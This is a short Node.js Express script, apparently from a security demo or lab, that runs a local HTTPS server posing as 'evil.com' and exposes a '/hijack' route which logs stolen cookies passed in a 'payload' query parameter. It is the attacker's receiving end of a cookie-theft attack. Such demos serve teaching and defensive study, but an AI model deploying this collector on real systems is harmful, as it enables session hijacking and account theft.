const localHost = require("https-localhost");
const express = require("express");
const app = localHost("evil.com");

app.use(express.static(__dirname + "/static"));

app.route("/hijack").get((request, response) => {
  console.log("received cookie", request.query.payload);
  response.status(200);
  response.send("ok");
});

app.listen(666);
